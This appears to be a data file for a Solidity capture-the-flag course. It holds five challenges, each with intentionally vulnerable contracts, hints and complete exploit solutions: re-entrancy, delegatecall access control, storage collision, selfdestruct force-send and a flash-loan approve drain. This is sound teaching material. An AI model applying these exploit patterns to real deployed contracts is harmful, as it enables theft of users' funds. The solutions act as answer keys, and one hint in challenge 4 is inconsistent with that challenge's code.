export const CHALLENGE_DETAILS = {
  1: {
    title: 'Re-Entrancy',
    tags: ['solidity', 'hard', 'security', 'ctf'],
    passed: 826,
    points: 300,
    scenario: 'Alice and Bob each has 1 ETH deposited into EthBank contract.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

contract EthBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external payable {
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent, "failed to send ETH");
        balances[msg.sender] = 0;
    }
}`,
    tasks: [
      {
        id: 1,
        description: 'Drain all ETH from EthBank. You are given 1 ETH when the function pwn is called.',
        completed: false,
      },
    ],
    hints: [
      'Inside pwn, deposit and then withdraw 1 ETH.',
      'receive will be called by EthBank so call withdraw again.',
      'Optionally send all ETH to attacker.',
    ],
    solution: `receive() external payable {
    if (address(bank).balance >= 1 ether) {
        bank.withdraw();
    }
}

function pwn() external payable {
    bank.deposit{value: 1 ether}();
    bank.withdraw();
    payable(msg.sender).transfer(address(this).balance);
}`,
  },
  2: {
    title: 'Improper Access Control',
    tags: ['solidity', 'easy', 'security', 'ctf'],
    points: 100,
    scenario: 'UpgradeableWallet is an upgradeable contract that uses delegatecall to execute the code of WalletImplementation.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

contract UpgradeableWallet {
    address public implementation;
    address public owner;

    constructor(address _implementation) {
        implementation = _implementation;
        owner = msg.sender;
    }

    fallback() external payable {
        (bool executed, ) = implementation.delegatecall(msg.data);
        require(executed, "failed");
    }
}

contract WalletImplementation {
    address public implementation;
    address payable public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    receive() external payable {}

    function setImplementation(address _implementation) external {
        implementation = _implementation;
    }

    function withdraw() external onlyOwner {
        owner.transfer(address(this).balance);
    }
}`,
    tasks: [
      {
        id: 1,
        description: 'Drain all ETH from UpgradeableWallet. Function pwn will be called to initiate the exploit.',
        completed: false,
      },
    ],
    hints: [
      'Anyone can call setImplementation',
      `function setImplementation(address _implementation) external {
    implementation = _implementation;
}`,
      'Take control of the UpgradeableWallet by setting the implementation to this contract.',
      'Next withdraw ETH from the wallet into this contract.',
      'Add a receive() external payable {} to receive ETH from the wallet.',
    ],
    solution: `receive() external payable {}

function _call(bytes memory data) private {
    (bool executed, ) = target.call(data);
    require(executed, "failed");
}

function pwn() external {
    _call(abi.encodeWithSignature("setImplementation(address)", address(this)));
    _call(abi.encodeWithSignature("withdraw()"));
}

function withdraw() external {
    payable(msg.sender).transfer(address(this).balance);
}`,
  },
  3: {
    title: 'Misaligned Storage',
    tags: ['solidity', 'medium', 'security', 'ctf'],
    points: 200,
    scenario: 'UpgradeableWallet is an upgradeable contract, executes code at WalletImplementation via delegatecall.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract UpgradeableWallet {
    address public implementation;
    address payable public owner;

    constructor(address _implementation) {
        implementation = _implementation;
        owner = payable(msg.sender);
    }

    fallback() external payable {
        (bool ok,) = implementation.delegatecall(msg.data);
        require(ok, "failed");
    }

    function setImplementation(address _implementation) external {
        require(msg.sender == owner, "not owner");
        implementation = _implementation;
    }
}

contract WalletImplementation {
    address public implementation;
    uint256 public limit;
    address payable public owner;

    receive() external payable {}

    modifier onlyOwner() {
        require(msg.sender == owner, "!owner");
        _;
    }

    function setWithdrawLimit(uint256 _limit) external {
        limit = _limit;
    }

    function withdraw() external onlyOwner {
        uint256 amount = address(this).balance;
        if (amount > limit) {
            amount = limit;
        }
        owner.transfer(amount);
    }
}`,
    tasks: [
      {
        id: 1,
        description: 'Drain all ETH from the wallet. The function pwn will be called to initiate the exploit.',
        completed: false,
      },
    ],
    hints: [
      'Update owner by calling setWithdrawLimit',
      'Set implementation to UpgradeableWalletExploit contract.',
      'Withdraw all ETH from the wallet by calling withdraw().',
      'Declare an receive() to receive ETH from UpgradeableWallet.',
    ],
    solution: `receive() external payable {}

function pwn() external {
    IUpgradeableWallet(target).setWithdrawLimit(
        uint256(uint160(address(this)))
    );
    IUpgradeableWallet(target).setImplementation(address(this));
    IUpgradeableWallet(target).withdraw();
}

function withdraw() external {
    payable(msg.sender).transfer(address(this).balance);
}`,
  },
  4: {
    title: 'Force Send ETH',
    tags: ['solidity', 'medium', 'security', 'ctf'],
    points: 200,
    scenario: 'SevenEth is a game, become the 7th person to deposit 1 ETH to win 7 ETH. You can deposit 1 ETH at a time. Alice and Bob already has 1 ETH deposited.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

contract SevenEth {
    function play() external payable {
        require(msg.value == 1 ether, "not 1 ether");
        uint256 bal = address(this).balance;
        require(bal <= 7 ether, "game over");
        if (bal == 7 ether) {
            payable(msg.sender).transfer(7 ether);
        }
    }
}`,
    tasks: [
      {
        id: 1,
        description: 'Disable the game so that no one can win 7 ETH. 10 ETH will be sent to pwn.',
        completed: false,
      },
    ],
    hints: [
      'Force ETH balance of contract to be more than 0.01 ETH',
      'selfdestruct can force send ETH to a contract',
      'Use selfdestruct in pwn function to send ETH to target',
      'The exploit contract needs a receive() function to receive ETH from the wrapper',
    ],
    solution: `receive() external payable {}

function pwn() external payable {
    selfdestruct(payable(target));
}`,
  },
  5: {
    title: 'ERC20 Flash Loan',
    tags: ['solidity', 'hard', 'security', 'ctf'],
    points: 300,
    scenario: 'LendingPool is offering ERC20 flash loans for free.',
    vulnerableCode: `contract LendingPool {
    IERC20 public token;

    constructor(address _token) {
        token = IERC20(_token);
    }

    function flashLoan(uint256 amount, address target, bytes calldata data)
        external
    {
        uint256 balBefore = token.balanceOf(address(this));
        require(balBefore >= amount, "borrow amount > balance");
        token.transfer(msg.sender, amount);
        (bool ok,) = target.call(data);
        require(ok, "loan failed");
        uint256 balAfter = token.balanceOf(address(this));
        require(balAfter >= balBefore, "balance after < before");
    }
}`,
    tasks: [
      {
        id: 1,
        description: 'Drain all token from LendingPool.',
        completed: false,
      },
    ],
    hints: [
      'Approve the exploit contract to transfer tokens from lending pool.',
    ],
    solution: `function pwn() external {
    uint256 bal = token.balanceOf(address(pool));
    pool.flashLoan(
        0,
        address(token),
        abi.encodeWithSelector(token.approve.selector, address(this), bal)
    );
    token.transferFrom(address(pool), address(this), bal);
}`,
  },
}

